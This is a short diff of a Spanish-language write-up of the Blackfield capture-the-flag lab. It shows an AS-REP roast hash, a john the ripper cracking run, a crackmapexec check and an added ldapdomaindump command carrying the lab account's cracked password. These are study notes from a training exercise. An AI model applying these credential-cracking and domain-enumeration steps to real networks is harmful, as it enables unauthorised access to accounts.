@@ -167,6 +167,7 @@ NTDS Credentials Extraction (secretsdump)
 
 ```
 Kerbrute apunta principalmente al puerto 88/TCP, que es el puerto estándar utilizado por el servicio de autenticación Kerberos. Este es el puerto en el que los servidores Kerberos escuchan solicitudes de autenticación.
+
 ```
 
 ```
@@ -208,7 +209,9 @@ $krb5asrep$23$support@BLACKFIELD.LOCAL:51a11dd4d2d236f6a335b94a678795ff$2d6bdc38
 ```
 ### como obtuvimos el hash podemos utilizar john de ripper para crakear la contraseña, se guarda el hash en un archivo.
 
-```└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
 Will run 4 OpenMP threads
@@ -217,6 +220,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 1g 0:00:00:14 DONE (2024-07-05 00:40) 0.06939g/s 994793p/s 994793c/s 994793C/s #1ByNature..#*burberry#*1990
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
+
 ```
 
 ### con esto ya podemos hacer pruebas de smb,crackmapexec, sin embargo de las prueba sin embargo no se encontro mucho y no se pownea
@@ -258,6 +262,9 @@ SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support
 ### Con la ayuda de ldapdomanindump podemos visualiar de manera grafica en html la estructura del AD.
 
 ```
+
+└─# ldapdomaindump -u 'blackfield.local\support' -p '#00^BlackKnight' 10.10.10.192
+
 nnecting to host...
 [*] Binding to host
 [+] Bind OK
